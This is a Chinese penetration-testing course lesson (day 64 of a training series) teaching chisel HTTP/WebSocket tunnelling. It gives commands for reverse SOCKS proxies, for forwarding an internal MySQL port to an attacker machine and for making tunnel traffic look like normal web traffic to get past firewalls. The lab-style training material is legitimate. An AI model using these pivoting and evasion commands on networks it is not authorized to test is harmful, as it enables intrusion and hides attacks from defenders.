---
title: Day064：内网渗透 - chisel 隧道与 HTTP 协议隧道
tags:
  - 网络安全
  - 渗透测试
  - 内网渗透
categories:
  - 90天安全突击
stage: 实战演练
abbrlink: 6eb31
date: 2026-01-28
updated: 2026-01-28
---

# Day064：内网渗透 - chisel 隧道与 HTTP 协议隧道

## 📋 基本信息

| 项目 | 内容 |
|------|------|
| **所属阶段** | 🏆 实战演练（第三阶段） |
| **所属周次** | Week 11-12：内网渗透基础 |
| **今日主题** | chisel 隧道与 HTTP 协议隧道 |
| **预计时间** | 3 小时 |
| **难度等级** | ⭐⭐⭐ 中级 |

---

## 🔥 今日痛点场景

> **场景**：目标网络的防火墙只开放 80 和 443 端口，其他端口全部封锁。你拿到了 webshell，但 frp 和 SSH 都连不出来。
>
> **问题**：如何在只有 HTTP/HTTPS 端口开放的情况下建立隧道？
>
> **今天的任务**：使用 chisel 建立 HTTP 协议隧道，绕过端口限制。

---

## 🎯 今日目标

完成今天的学习后，你应该能够：

- [ ] 理解 HTTP 隧道的原理
- [ ] 部署 chisel 服务端和客户端
- [ ] 建立反向 SOCKS5 代理
- [ ] 使用 chisel 进行端口转发

**闯关条件**：通过 chisel 隧道成功访问内网资源。

---

## ⚔️ 实战任务（先动手！）

### 任务 1：下载 chisel（10 分钟）

```bash
# 下载最新版 chisel
wget https://github.com/jpillora/chisel/releases/download/v1.9.1/chisel_1.9.1_linux_amd64.gz
gunzip chisel_1.9.1_linux_amd64.gz
mv chisel_1.9.1_linux_amd64 chisel
chmod +x chisel

# Windows 版本（给跳板机用）
# chisel_1.9.1_windows_amd64.gz
```

---

### 任务 2：chisel 正向连接（25 分钟）

**场景**：攻击机可以主动连接跳板机

**服务端（跳板机）**：
```bash
./chisel server -p 8080 --socks5
```

**客户端（Kali）**：
```bash
./chisel client 192.168.1.50:8080 socks
```

**配置代理使用**：
```bash
# proxychains4.conf
socks5 127.0.0.1 1080

# 使用代理
proxychains4 nmap -sT -Pn 10.0.0.100
```

---

### 任务 3：chisel 反向连接（30 分钟）

**场景**：跳板机不能被主动连接，但能出网

**服务端（Kali 攻击机）**：
```bash
./chisel server -p 8080 --reverse
```

**客户端（跳板机）**：
```bash
./chisel client 192.168.1.100:8080 R:socks
# R: 表示反向
```

**结果**：在 Kali 的 1080 端口开启 SOCKS5 代理。

---

### 任务 4：chisel 端口转发（20 分钟）

**正向端口转发**：
```bash
# 客户端
./chisel client 192.168.1.50:8080 8888:10.0.0.100:80
# 本地 8888 端口映射到内网 10.0.0.100:80
```

**反向端口转发**：
```bash
# 服务端
./chisel server -p 8080 --reverse

# 客户端
./chisel client 192.168.1.100:8080 R:8888:127.0.0.1:3306
# 攻击机 8888 端口映射到跳板机本地 3306
```

---

### 任务 5：伪装 HTTP 流量（20 分钟）

```bash
# 服务端启用认证
./chisel server -p 80 --reverse --auth user:pass

# 客户端带认证连接
./chisel client --auth user:pass http://192.168.1.100:80 R:socks

# 流量看起来像正常的 HTTP WebSocket
```

---

## ✅ 今日闯关检查

| 检查项 | 状态 |
|--------|------|
| chisel 服务端启动成功 | ⬜ |
| chisel 客户端连接成功 | ⬜ |
| 正向 SOCKS 代理可用 | ⬜ |
| 反向 SOCKS 代理可用 | ⬜ |
| 端口转发成功 | ⬜ |

---

## 📖 底层补课（做完实验再看）

### HTTP 隧道原理

chisel 使用 HTTP/WebSocket 协议封装隧道流量：

```
┌─────────────┐    HTTP/WS    ┌─────────────┐
│   客户端     │ ═══════════→ │   服务端     │
│ (数据封装)   │   端口 80    │ (数据解封)   │
└─────────────┘               └─────────────┘
      ↑                             ↓
  原始 TCP 数据               转发到目标
```

**优势**：
- 走 80/443 端口，看起来像正常 Web 流量
- 支持 HTTP 代理穿透
- 单二进制文件，便于传输

### chisel vs frp vs SSH

| 特性 | chisel | frp | SSH |
|------|--------|-----|-----|
| 协议 | HTTP/WS | TCP | TCP |
| 端口要求 | 80/443 | 自定义 | 22 |
| 绕防火墙 | 强 | 中 | 弱 |
| 配置复杂度 | 低 | 中 | 低 |
| 文件大小 | ~10MB | ~10MB | 系统自带 |

---

## ⚠️ 避坑指南

| 坑点 | 症状 | 解决方案 |
|------|------|----------|
| 连接被重置 | connection reset | 检查防火墙是否拦截 WebSocket |
| 客户端报错 | dial tcp: timeout | 检查服务端地址和端口 |
| 代理不通 | SOCKS5 无响应 | 确认使用 R:socks（反向）或 socks（正向） |
| 认证失败 | 401 Unauthorized | 检查 --auth 参数两端是否一致 |

---

## 💡 知识卡片速查

### chisel 命令速查

| 场景 | 服务端 | 客户端 |
|------|--------|--------|
| 正向 SOCKS | `server -p 8080 --socks5` | `client IP:8080 socks` |
| 反向 SOCKS | `server -p 8080 --reverse` | `client IP:8080 R:socks` |
| 正向端口转发 | `server -p 8080` | `client IP:8080 8888:目标:端口` |
| 反向端口转发 | `server -p 8080 --reverse` | `client IP:8080 R:8888:目标:端口` |

---

## ❓ 常见问题

**Q1：chisel 和 reGeorg 有什么区别？**

A1：reGeorg 需要上传 webshell（如 tunnel.php），chisel 是独立二进制，更通用。

**Q2：如何让 chisel 更隐蔽？**

A2：使用 443 端口 + TLS + 认证，流量特征类似 HTTPS。

---

## 🚀 明日预告

**Day 065：内网渗透 - 多级代理与代理链**

明天你将：
- 构建多级代理穿透多层内网
- 使用 proxychains 配置代理链
- 解决多层网络隔离问题

---

## 📊 学习记录（学习者填写）

| 项目 | 内容 |
|------|------|
| 实际学习日期 | ____年__月__日 |
| 实际用时 | ____ 小时 |
| 遇到的问题 | |
| 解决方法 | |
| 今日收获 | |
| 自评分数 | ⭐⭐⭐⭐⭐ (1-5星) |

---

> 💬 **导师点评**：
>
> chisel 是绕防火墙的神器。当 frp 被拦、SSH 不通的时候，chisel 往往能救命。
>
> 记住：正向是你连它，反向是它连你。R: 前缀 = Reverse。
>
> HTTP 隧道是企业网络渗透的常规操作，因为很少有公司会完全封锁 80/443。

```bash
echo "Day 064 Complete! chisel 隧道掌握！"
```
